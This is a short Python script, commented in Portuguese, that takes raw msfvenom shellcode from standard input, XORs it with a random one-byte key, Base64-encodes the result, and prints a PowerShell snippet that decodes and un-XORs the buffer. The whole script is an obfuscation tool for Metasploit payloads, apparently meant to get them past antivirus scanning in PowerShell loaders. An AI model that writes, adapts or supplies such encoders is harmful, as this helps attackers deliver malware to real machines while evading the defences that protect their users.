import sys
import random
import base64

# Cores para o terminal
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
END = "\033[0m"

def generate_b64_xored():
    # Lê a entrada binária do msfvenom (-f raw)
    try:
        shellcode = sys.stdin.buffer.read()
    except Exception as e:
        print(f"Erro ao ler entrada: {e}")
        return

    if not shellcode:
        print(f"{YELLOW}[!] Erro: Nenhum dado recebido. Use: msfvenom ... -f raw | python3 script.py{END}")
        return

    # 1. Gera chave aleatória (0x01 a 0xFF)
    key = random.randint(1, 255)

    # 2. Aplica o XOR nos bytes originais
    xored_bytes = bytearray([b ^ key for b in shellcode])

    # 3. Converte o resultado do XOR para uma string Base64
    b64_string = base64.b64encode(xored_bytes).decode('utf-8')

    # Output formatado exatamente como solicitado
    print(f"\n{GREEN}{BOLD}[+] Shellcode processado com sucesso!{END}")
    print(f"{CYAN}{BOLD}# --- POWERSHELL OUTPUT ---{END}\n")

    print(f'$b64 = "{b64_string}"')
    print('$buf = [System.Convert]::FromBase64String($b64)')
    print('')
    print(f'$xKey = 0x{key:02x}')
    print('for ($i = 0; $i -lt $buf.Length; $i++) {')
    print('    $buf[$i] = $buf[$i] -bxor $xKey')
    print('}')

    print(f"\n{CYAN}{BOLD}{'='*50}{END}")

if __name__ == "__main__":
    generate_b64_xored()
